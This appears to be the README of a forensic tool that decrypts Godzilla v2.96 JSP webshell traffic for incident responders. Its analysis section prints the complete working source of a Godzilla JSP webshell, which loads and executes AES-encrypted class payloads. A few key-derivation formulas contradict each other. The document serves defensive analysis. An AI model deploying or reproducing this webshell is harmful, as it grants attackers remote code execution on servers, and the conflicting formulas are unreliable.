#kingkong

Decrypt Godzilla-V2.96 webshell management tool traffic

**Currently only supports jsp type webshell traffic decryption**

#Usage

1. Obtain the webshell sample uploaded to the server by the attacker
![01decodeunicode.png](./docs/01decodeunicode.png)
2. Obtain traffic packages such as wireshark. Generally, Party A has a full-traffic mirroring device such as Kelai. Contact the operation and maintenance personnel to obtain it. Here, we take `test.papng` as an example.
![02wireshark package.png](./docs/02wireshark package.png)
3. Export all http objects and place them in folders
![03Export object.png](./docs/03Export object.png)
![04ExportObject.png](./docs/04ExportObject.png)
4. Edit the `kingkong.py` script, find the line `#config`, and configure the obtained sample password, key, and the folder path just now
![](./docs/05configuration.png)
5. py -2 kingkong.py
![](./docs/06Decrypted Traffic.png)

#Config

```
#config
#Configure webshell key
key = '3c6e0b8a9c15224a'
#Configure the password of webshell
password = 'pass'
#Configure the path for wireshark to export http objects
filepath = '.'
#Whether the configuration is jsp+base64, set False to decrypt JAVA_AES_RAW traffic, set True to decrypt JAVA_AES_BASE64 traffic
isbase64 = False
```

#Analysis

1. Format the generated webshell

```java
<%!
String xc="3c6e0b8a9c15224a"; //md5("key")[0:16]
String pass="pass"; //get parameters
String md5=md5(pass+xc); //Response delimiter
class X extends ClassLoader
     {
         public X(ClassLoader z)
         {
             super(z);
         }
         public Class Q(byte[] cb)
         {
             return super.defineClass(cb, 0, cb.length);
         }
     }


     //aes decryption
     public byte[] x(byte[] s,boolean m)
     {
         try{
             javax.crypto.Cipher c=javax.crypto.Cipher.getInstance("AES");
             c.init(m?1:2,new javax.crypto.spec.SecretKeySpec(xc.getBytes(),"AES"));
             return c.doFinal(s);
             }catch (Exception e)
             {
                 return null;
             }
     }
     //md5 16-digit uppercase
     public static String md5(String s) {
         String ret = null;
         try {
             java.security.MessageDigest m;
             m = java.security.MessageDigest.getInstance("MD5");
             m.update(s.getBytes(), 0, s.length());
             ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();
             } catch (Exception e) {}
             return ret;
     }


     //base64 encoding
     public static String base64Encode(byte[] bs) throws Exception
     {
         Class base64;
         String value = null;
         try {
             base64=Class.forName("java.util.Base64");
             Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
             value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e) { try { base64=Class.forName("sun.misc.BASE64Encoder");
             Object Encoder = base64.newInstance();
             value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });} catch (Exception e2) { }}return value;
     }


     //base64 decoding
     public static byte[] base64Decode(String bs) throws Exception
     {
         Class base64;
             byte[] value = null;
         try {
                 base64=Class.forName("java.util.Base64");
                 Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
                 value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });
             }
         catch (Exception e)
             {
             try {
                     base64=Class.forName("sun.misc.BASE64Decoder");
                     Object decoder = base64.newInstance();
                     value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });
                 }
             catch (Exception e2)
                 {


                 }
             }
             return value;
     }
%>
<%
try{
         byte[] data=base64Decode(request.getParameter(pass));
         data=x(data, false);
         if (session.getAttribute("payload")==null)
         {
             session.setAttribute("payload",new X(pageContext.getClass().getClassLoader()).Q(data));
         }else
         {
                     request.setAttribute("parameters", new String(data));
                     Object f=((Class)session.getAttribute("payload")).newInstance();
                     f.equals(pageContext);
                     response.getWriter().write(md5.substring(0,16));
                     response.getWriter().write(base64Encode(x(base64Decode(f.toString()), true)));
                     response.getWriter().write(md5.substring(16));
         }
     }catch (Exception e)
         {


         }
%>
```

2. You can see that there are mainly base64 encoding and decoding, aes decryption, and md5 hash functions.
Focus on the key parameters:
```
String xc="3c6e0b8a9c15224a";
```

3. This parameter is defined by the "key" parameter in the generated webshell. The specific value is:
```
md5(xc)[0:16]
```
4. After the webshell client receives the instruction issued by the server, it performs base64 decoding. After the AES decryption process is completed, a response message is generated. The message structure is:
```
md5(pass+xc)[0:16]+base64 encoded Trojan execution result+md5(pass+xc)[16]
```
